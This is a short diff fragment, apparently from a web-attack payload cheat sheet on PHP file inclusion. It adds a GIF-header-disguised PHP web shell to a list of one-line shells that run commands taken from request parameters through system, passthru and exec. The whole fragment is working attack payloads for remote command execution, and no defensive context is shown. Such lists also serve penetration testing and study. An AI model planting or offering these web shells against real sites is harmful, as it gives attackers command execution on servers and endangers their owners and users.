@@ -279,6 +279,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 ```php
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
+GIF89a; <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
 <?php echo exec($_GET['cmd']); ?>
 <?php system($_REQUEST['cmd']); ?>
